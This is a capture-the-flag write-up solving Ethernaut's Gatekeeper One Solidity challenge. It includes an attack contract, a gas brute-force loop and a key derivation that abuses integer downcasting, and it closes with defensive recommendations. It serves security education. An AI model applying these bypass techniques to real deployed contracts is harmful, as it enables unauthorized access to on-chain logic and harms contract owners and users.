# Level 13 - Gatekeeper One

## Objectives

- Make it past the gatekeeper and register as an entrant to pass this level.

## Contract Overview

To reach the objective and enter the `GatekeeperOne` contract it is necessary to get past the three gates.

## Static analysis (slither)

Here are the logs from the slither:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/GatekeeperOne_slither.png)

## Finding the weak spots

In the `GatekeeperOne` contract, all modifiers follow the correct execution paths, and they either revert the transaction or end with an underscore \_. To successfully enter the contract, the requirements set by the modifiers must be satisfied.

### The first gate

```solidity
  modifier gateOne() {
    require(msg.sender != tx.origin); // <-- this line over here
    _;
  }
```

To satisfy the `msg.sender =! tx.origin` check we need to call the
`GatekeeperOne` contract from another contract. This is the same thing as in the
[Telephone - level 4](https://github.com/matrix-0wl/ethernaut-solutions-foundry/tree/master/src/levels/04-Telephone)
challenge.

In other words to ensure that msg.sender and tx.origin are different, an intermediary contract can be created to make function calls to the GatekeeperOne contract. By doing so, the caller's address will become the tx.origin, and the deployed contract's address will be the msg.sender received by the GatekeeperOne contract.

### The second gate

```solidity
  modifier gateTwo() {
    require(gasleft() % 8191 == 0); // <-- this line over here
    _;
  }
```

To pass through the second gate we need to understand what the `gasleft()`
function does. It
[returns the remaining gas](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html#block-and-transaction-properties)
in a transaction as a `uint256` number.

By combining this information with the fact that modifiers are executed at the beginning of a function call, it is possible to pass the second gate. To do so, the attacker must provide a quantity of gas that is evenly divisible by 8191 with no remainder.

In the case of the GatekeeperOne contract where an exact amount of gas is required to pass the second gate, a brute force approach can be used to determine the correct amount of gas to send. This involves incrementing the amount of gas in each function call until the correct value is found.

```solidity
        uint256 _gasAmount;

        for (uint256 i = 0; i <= 10000; i++) {
            try gatekeeperOneContract.enter{gas: 8191 * 10 + i}(_gateKey) {
                console.log("passed with gas ->", 8191 * 10 + i);
                _gasAmount = 8191 * 10 + i;

                break;
            } catch {}
        }
```

### The third gate

To solve the final gate, it is important to understand how casting from one type to another and downcasting works. When you cast from a smaller type to a larger one, there is no problem, as all the high order bits are filled with zero and the value remains the same. The problem arises when you cast a larger type to a smaller one, as data loss can occur due to the truncation of high order bits, depending on the value being cast. Therefore, it is important to carefully consider the type of data being cast to ensure that no data loss occurs.

To pass the final gate of the `GatekeeperOne` contract, we need to find a single `_gateKey` value that satisfies all the following requirements:

```solidity
  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one"); // <-- this line over here
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two"); // <-- this line over here
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three"); // <-- this line over here
    _;
  }
```

We have three requirments that we have to fullfill:
`uint32(uint64(_gateKey)) == uint16(uint64(_gateKey));`
`uint32(uint64(_gateKey)) != uint64(_gateKey);`
`uint32(uint64(_gateKey)) == uint16(uint160(tx.origin));`

Size of `uint64` is 8 bytes so `key = uint64(_gateKey)` and Tte `tx.origin` variable is of type address, which is a 20-byte (160-bit) identifier in the Ethereum network. This means that the size of `tx.origin` is also 20 bytes or 160 bits, just like `uint160`.

Now after substitution we have:
`uint32(key) == uint16(key);`
`uint32(key) != key;`
`uint32(key) == uint16(tx.origin);`

So after another substitution we have:
`uint16(key) == uint16(tx.origin);`

That fullfills two conditions:
`uint32(key) == uint16(key);`
`uint32(key) == uint16(tx.origin);`

We have one more condition to fullfill:
`uint32(key) != key;`

We have to notice that our `key` is `uint64` so if we put a 1 at the very left of this number and then casts it to `uint32` that 1 on the very left will be cut off so that `uint32(key) != key;`

So to satisfy this condition:
`uint64(1 << 63) + uint64(uint16(tx.origin)) == key == uint64(_gateKey)`

No we have to convert it to bytes8. As we mentioned size of `uint64` is 8 bytes. So:
`uint64 _gateKeyUint = uint64(1 << 63) + uint64(uint16(tx.origin))`

Now we can convert it to `bytes8`:
`bytes8 _gateKey = bytes8(_gateKeyUint);`

## Potential attack scenario (hypothesis)

An attacker can register themselves as an entrant in the `GatekeeperOne` contract by calling the enter function from the `GatekeeperOneAttack` contract.

- A call from the contract will satisfy the criteria of the first gate.
- To pass the second gate, the attacker must supply the function call with an amount of gas that is a multiple of 8191
- To pass the third gate attacker can reverse the `_gateKey` from the third `require`
  block.

## Plan of the attack

1. Attacker creates the `GatekeeperOneAttack` contract
   - The contract contains an `attack()` function which will make a call to the
     `enter()` function on the `GatekeeperOne` contract.
   - The amount of gas for this call will be calcutated via brute force approach.
   - The key will be calculated thanks to substitutions and conversions.
2. Attacker should successfully register herself as an entrant.

## Malicious contract (GatekeeperOneAttack.sol)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./GatekeeperOne.sol";

contract GatekeeperOneAttack {
    GatekeeperOne gatekeeperOneContract;

    constructor(address _gatekeeperOneContract) public {
        gatekeeperOneContract = GatekeeperOne(_gatekeeperOneContract);
    }

    function attack(bytes8 _gateKey, uint256 _gasAmount) external {
        gatekeeperOneContract.enter{gas: _gasAmount}(_gateKey);
    }
}
```

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/13-GatekeeperOne.t.sol))

```solidity
  GatekeeperOneAttack gatekeeperOneAttack = new GatekeeperOneAttack(
            address(gatekeeperOneContract)
        );

        // GATE 3 condition 3
        uint64 _gateKeyUint = uint64(1 << 63) + uint64(uint16(tx.origin));
        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_string("_gateKeyUint = ");
        console.log(_gateKeyUint);
        emit log_string(
            "--------------------------------------------------------------------------"
        );

        bytes8 _gateKey = bytes8(_gateKeyUint);
        emit log_string(
            "--------------------------------------------------------------------------"
        );
        emit log_string("_gateKey = ");
        console.logBytes8(_gateKey);
        emit log_string(
            "--------------------------------------------------------------------------"
        );

        // GATE 3 condition 2
        uint256 _gasAmount;

        for (uint256 i = 0; i <= 10000; i++) {
            try gatekeeperOneContract.enter{gas: 8191 * 10 + i}(_gateKey) {
                console.log("passed with gas ->", 8191 * 10 + i);
                _gasAmount = 8191 * 10 + i;

                break;
            } catch {}
        }

        // GATE 3 condition
        gatekeeperOneAttack.attack(_gateKey, _gasAmount);

        emit log_named_address(
            "Address of the entrant: ",
            gatekeeperOneContract.entrant()
        );

        assertEq(gatekeeperOneContract.entrant(), tx.origin);
```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/GatekeeperOne.png)

## Recommendations

- Data types conversion and casting may or may not lead to a loss of data
- Critical functions and modifiers should not implement their logic around gas assumptions as they can be easily bypassed

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [Blog Stermi](https://stermi.xyz/blog/ethernaut-challenge-13-solution-gatekeeper-one)
- [D-Squared YT - Ethernaut CTF Series](https://www.youtube.com/watch?v=_ylKN2R_o-Y&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz)
- [Smart Contract Programmer YT - Ethernaut](https://www.youtube.com/playlist?list=PLO5VPQH6OWdWh5ehvlkFX-H3gRObKvSL6)
- [Mastering Ethereum book](https://github.com/ethereumbook/ethereumbook)
- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)
